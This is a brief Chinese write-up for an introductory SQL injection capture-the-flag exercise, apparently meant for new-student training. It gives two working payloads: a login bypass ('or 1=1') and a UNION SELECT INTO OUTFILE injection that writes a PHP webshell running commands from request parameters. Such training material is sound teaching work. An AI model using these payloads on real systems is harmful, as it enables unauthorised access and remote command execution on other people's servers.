# SQLI 综合
一道简单的SQLI综合利用题，适合用在新生培训和Hgame-Mini.
攻击点在首页的SQL注入万能密码登录和WebShell注入.
```php
admin' or 1=1;#
```
```php
a' union select "","<?php @system($_REQUEST['cmd']);?>","","" into OUTFILE '/var/www/html/shell.php';#
```
